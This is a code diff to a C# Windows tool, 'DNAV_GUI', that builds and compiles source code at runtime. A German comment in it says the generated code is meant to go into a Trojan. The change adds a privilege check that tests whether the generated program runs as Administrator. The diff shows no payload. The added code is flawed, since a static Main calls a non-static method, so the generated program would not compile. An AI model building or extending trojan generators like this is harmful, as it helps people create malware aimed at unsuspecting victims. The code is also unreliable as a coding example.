@@ -1174,7 +1174,7 @@ namespace DNAV_GUI
             parameters.ReferencedAssemblies.Add("System.DirectoryServices.dll");
 
 
-            string code = "using System;using System.Threading;";
+            string code = "using System;using System.Threading;using System.Security.Principal;";
 
             if (useSystemDiagnostics)
                 code += "using System.Diagnostics;";
@@ -1195,7 +1195,16 @@ namespace DNAV_GUI
 
             code += "namespace " + nameTextBox.Text + "{";
             code += "class Program{";
+            // Funktion, um auf Adminrechte zu prüfen
+            code += @"private bool checkAdmin()
+        {
+                WindowsIdentity identity = WindowsIdentity.GetCurrent();
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+            ";
             code += "static void Main(){";
+            code += "bool isAdmin = checkAdmin();";
             code += "Console.Title = \"" + nameTextBox.Text + "\";";
 
             // Hier landet Code, welcher in den Trojaner soll.
